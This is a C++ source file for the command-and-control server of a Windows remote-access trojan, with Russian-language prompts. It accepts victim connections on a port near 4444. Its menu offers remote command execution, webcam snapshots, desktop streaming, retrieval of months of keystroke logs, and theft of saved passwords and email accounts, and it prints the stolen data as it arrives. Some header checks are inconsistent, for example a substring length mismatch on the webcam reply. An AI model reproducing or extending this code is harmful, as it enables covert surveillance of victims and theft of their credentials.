#include <iostream>
#include <string>
#include <vector>
#include <cstdlib>
#include <cstdio>
#include <winsock2.h>
#include <windows.h>
#include <ctime>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

using namespace std;

const int FIXED_PORT = 4444 + (time(0) % 100);
const int BUFFER_SIZE = 16384; 

void SendData(SOCKET sock, const string& data) {
    send(sock, data.c_str(), data.length(), 0);
}

string ReceiveData(SOCKET sock) {
    char buffer[BUFFER_SIZE] = {0};
    int valread = recv(sock, buffer, BUFFER_SIZE, 0);
    if (valread > 0) {
        return string(buffer, valread);
    }
    return "";
}

void display_help() {
    cout << "\n--- ДОСТУПНЫЕ КОМАНДЫ ---\n";
    cout << "EXEC [команда]       - Выполнить команду на удаленной машине.\n";
    cout << "WEBCAM_SNAP          - Захватить изображение с веб-камеры.\n";
    cout << "DESKTOP_STREAM       - Начать живую трансляцию рабочего стола.\n";
    cout << "GET_KEYLOGS          - Получить лог клавиатуры за 5 месяцев.\n";
    cout << "GET_CREDS            - Украсть сохраненные пароли и почты.\n";
    cout << "GET_PROCESSES        - Получить список процессов.\n";
    cout << "KILL_ID [PID]        - Завершить процесс.\n";
    cout << "EXIT                 - Отключить клиента.\n";
    cout << "-------------------------\n";
}

void client_handler(SOCKET client_socket) {
    struct sockaddr_in client_addr;
    int addrlen = sizeof(client_addr);
    getpeername(client_socket, (struct sockaddr*)&client_addr, &addrlen);
    char *client_ip = inet_ntoa(client_addr.sin_addr);

    cout << "\n[СЕРВЕР] Клиент подключен. IP: " << client_ip << ". Нажмите HELP для команд.\n";

    while (true) {
        cout << client_ip << ">> ";
        string user_input;
        getline(cin, user_input);

        if (user_input.empty()) continue;

        if (user_input == "HELP") {
            display_help();
            continue;
        }

        if (user_input == "EXIT") {
            SendData(client_socket, "EXIT");
            cout << "[СЕРВЕР] Отключение клиента...\n";
            break;
        }
        
        SendData(client_socket, user_input); 

        string response_header = ReceiveData(client_socket);
        
        if (response_header.empty()) {
             cout << "[ОШИБКА] Соединение потеряно.\n";
             break;
        }
        
        if (response_header.substr(0, 15) == "KEYLOGS_DUMPED") {
            cout << "\n--- КЕЙЛОГИ ЗА 5 МЕСЯЦЕВ ---\n" << response_header.substr(16) << "\n";
        }
        else if (response_header.substr(0, 10) == "CREDS_DUMP") {
            cout << "\n--- СЕКРЕТНЫЕ ДАННЫЕ (Пароли/Почты) ---\n" << response_header.substr(11) << "\n";
        }
        else if (response_header.substr(0, 10) == "CAM_B64:") {
            cout << "\n[СЕРВЕР] Снимок веб-камеры получен (Base64). Сохранение...\n";
        }
        else if (response_header.substr(0, 15) == "STREAM_STARTED") {
            cout << "[СЕРВЕР] Поток рабочего стола начат. (Требуется отдельный RDP-модуль)\n";
        }
        else if (response_header.substr(0, 12) == "CMD_OUTPUT:") {
            cout << "\n--- РЕЗУЛЬТАТ КОМАНДЫ ---\n" << response_header.substr(13) << "\n";
        }
        else {
             cout << "\nОТВЕТ КЛИЕНТА: " << response_header << endl;
        }
    }

    closesocket(client_socket);
}

int main() {
    cout << "Динамический порт: " << FIXED_PORT << endl;
    
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 1;

    SOCKET server_fd, new_socket;
    struct sockaddr_in address;
    int addrlen = sizeof(address);

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt));

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(FIXED_PORT);

    if (::bind(server_fd, (struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR) {
        closesocket(server_fd); WSACleanup(); return 1;
    }

    if (listen(server_fd, 5) == SOCKET_ERROR) {
        closesocket(server_fd); WSACleanup(); return 1;
    }

    cout << "C++ Контроль Сервер запущен на порту " << FIXED_PORT << ". Ожидание подключения..." << endl;

    while (true) {
        new_socket = accept(server_fd, (struct sockaddr *)&address, &addrlen);
        if (new_socket == INVALID_SOCKET) continue;

        client_handler(new_socket);
    }

    closesocket(server_fd);
    WSACleanup();
    return 0;
}
